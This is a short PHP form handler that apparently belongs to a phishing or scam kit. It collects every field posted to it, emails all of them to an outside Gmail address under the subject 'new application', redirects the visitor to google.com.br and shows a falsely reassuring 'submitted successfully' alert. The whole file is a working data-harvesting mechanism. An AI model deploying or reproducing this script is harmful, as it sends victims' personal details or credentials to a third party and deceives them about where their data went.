<?php

$mailto = 'keleosgeorgette@gmail.com';
	$subject = 'new application';
	$input = $_POST;
	header ("Location: https://www.google.com.br");
	$msg = '';
	foreach($input as $key => $value ) {
	     $msg .= $key.' : '.$value."\n";
	}
	mail($mailto, $subject, $msg);
echo "<script>alert('your form was submitted successfully, we will proccess it and get back to you.')</script>";
echo "<script>window.location='index.html'</script>";

?>